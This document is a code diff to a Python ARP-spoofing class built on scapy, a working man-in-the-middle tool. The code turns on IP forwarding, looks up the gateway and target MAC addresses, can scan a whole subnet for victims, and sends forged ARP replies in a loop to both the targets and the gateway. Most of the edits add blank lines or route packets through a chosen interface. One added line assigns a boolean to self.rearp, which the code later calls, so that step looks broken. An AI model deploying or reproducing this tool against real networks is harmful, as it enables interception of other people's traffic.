@@ -53,13 +53,19 @@ class ARPspoofer(threading.Thread):
         self.queue = queue
         self.iface_mac = None
         self.iface = None
+        self.rearp = True
+
         logger.info("Initializing ARPspoofer...")
         if os.getuid():
             logger.error("Run me as root!")
             sys.exit(-1)
+
         logger.warning("Used kernel ipv4 forwarding feature.")
+
         os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+
         logger.info("Kernel IPv4 forwarding enabled")
+
         self.__config_load(config)
 
     def __config_load(self, config={}):
@@ -70,38 +76,49 @@ class ARPspoofer(threading.Thread):
         """
         logger.info("Loading config...")
         print(config)
+
         self.gw = config.get('gateway', None)
+
         if not self.gw:
             logger.critical("IP of gateway not specified! Using default one: {}".format(DEFAULT_GATEWAY))
             self.gw = DEFAULT_GATEWAY
 
         mac = utils.arpping(self.gw)
+
         while mac is None:
             logger.debug('Cannot obtain MAC addr of the gateway. Make sure {} is correct!'.format(self.gw))
             mac = utils.arpping(self.gw)
+
         self.ip_mac[self.gw] = mac
         logger.debug('Gateway MAC addr: {}'.format(mac))
 
         self.network = config.get('network', None)
+
         if self.network is None:
             logger.debug('Using default network! {}'.format(DEFAULT_NETWORK))
             self.network = DEFAULT_NETWORK
 
         self.targets = config.get('target', None)
+
         if not self.targets:
             logger.debug('No explicit targets found! Calculating from the net!')
             self.targets = utils.get_hosts(self.network)
+
         logger.debug('Targets: {}'.format(self.targets))
+
         for t in self.targets:
             mac = utils.arpping(t)
             cc = 0
+
             while mac is None:
                 logger.debug('Target {} has MAC: {}'.format(t, mac))
                 cc += 1
                 mac = utils.arpping(t)
+
                 if cc > 3 and mac is None:
                     logger.critical('Cannot determine MAC addr of {}'.format(t))
                     raise ValueError('Check if {} addr is correct!'.format(t))
+
             if mac is not None:
                 self.ip_mac[t] = mac
 
@@ -116,12 +133,14 @@ class ARPspoofer(threading.Thread):
         """
         logger.debug('reARPing session started!')
         cont = True
+
         for i in range(REARP_VAL):
             logger.debug('reARPing iteration: {}'.format(i))
             for ip, mac in self.ip_mac.items():
                 if self.event.is_set():
                     cont = False
                     break
+
                 vb = 0 if i % 2 == 0 else 1
                 logger.debug('{} is at {} send to {} {}'.format(ip, mac, self.gw, self.ip_mac[self.gw]))
                 ARPspoofer.__send_ARP(ip, mac, self.gw, self.ip_mac[self.gw], vb)
@@ -131,6 +150,7 @@ class ARPspoofer(threading.Thread):
             if not cont:
                 logger.debug('reARPing canceled!')
                 break
+
         logger.debug('reARPing finished...')
 
     def __spoof(self):
@@ -154,7 +174,8 @@ class ARPspoofer(threading.Thread):
             #                                                               hwsrc=self.iface_mac)
             # sendp(pkt, verbose=0)
             vb = 1 if counter == INTERVAL else 0
-            ARPspoofer.__send_ARP(ip, mac, self.gw, self.iface_mac, vb)
+            ARPspoofer.__send_ARP(ip, mac, self.gw, self.iface_mac, self.iface, vb)
+
             if vb:
                 logger.debug('Sending ARP spoof message! Target: {}'.format(ip))
 
@@ -163,14 +184,15 @@ class ARPspoofer(threading.Thread):
             # pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.iface_mac) / ARP(op=2, pdst=self.gw, psrc=ip,
             #                                                               hwdst="ff:ff:ff:ff:ff:ff")  # self.ip_mac[self.gw])
             # sendp(pkt, verbose=0)
-            ARPspoofer.__send_ARP(self.gw, self.ip_mac[self.gw], ip, self.iface_mac, vb)
+            ARPspoofer.__send_ARP(self.gw, self.ip_mac[self.gw], ip, self.iface_mac, self.iface, vb)
+
             if vb:
                 logger.debug('Sending ARP spoof message to GW with target: {}'.format(ip))
 
             time.sleep(1.0)
 
     @staticmethod
-    def __send_ARP(destination_ip, destination_mac, source_ip, source_mac, verbose=0):
+    def __send_ARP(destination_ip, destination_mac, source_ip, source_mac, interface, verbose=0):
         """
         Helper static method wrapping creating ARP packet and sendp function from scapy module.
         :param destination_ip: - IPv4 of a destination host pdst param
@@ -179,19 +201,20 @@ class ARPspoofer(threading.Thread):
         :param source_mac: strin - MAC of a source host hwsrc param
         :return:
         """
+
         if verbose:
             logger.debug(
                 'Creating packet ARP: ipsrc: {} hwsrc: {} ipdst: {} hwdst: {}'.format(
                     source_ip, source_mac, destination_ip, destination_mac)
             )
 
-        pkt = Ether('ff:ff:ff:ff:ff:ff') / ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
+        pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                      psrc=source_ip, hwsrc=source_mac)
 
         if verbose:
             logger.debug('Packet created: {}'.format(pkt.show(dump=True)))
 
-        sendp(pkt, verbose=0)
+        sendp(pkt, iface=interface, verbose=0)
 
     def __execute_cmd(self, cmd):
         """
@@ -224,8 +247,10 @@ class ARPspoofer(threading.Thread):
 
             elif cmd[0].strip() == 'd':
                 logger.debug('Removing entry {} from target queue!'.format(cmd[1]))
+
                 try:
                     self.targets.remove(cmd[1])
+
                 except ValueError:
                     logger.warning('Input: {} not in target list! Cannot remove!'.format(cmd[1]))
 
@@ -243,8 +268,10 @@ class ARPspoofer(threading.Thread):
             while not self.event.is_set():
                 if counter == INTERVAL:
                     logger.debug('Iterating...')
+
                 else:
                     counter += 1
+
                 while not self.queue.empty() and not self.event.is_set():
                     cmd = self.queue.get()
                     logger.debug('New command: {}'.format(cmd))
@@ -256,17 +283,23 @@ class ARPspoofer(threading.Thread):
                         self.ip_mac[t] = mac
 
                 self.__spoof()
+
                 time.sleep(0.10)
+
                 if counter == INTERVAL:
                     counter = 0
+
         except KeyboardInterrupt:
             logger.info('Exiting by KeyboardInterrupt')
+
         finally:
             print("arpspoofer exiting!")
 
         print("reARPing the network!")
         logger.debug('reARPing the network')
+
         self.rearp()
+
         logger.debug('reARPing finished!')
 
     def run(self):
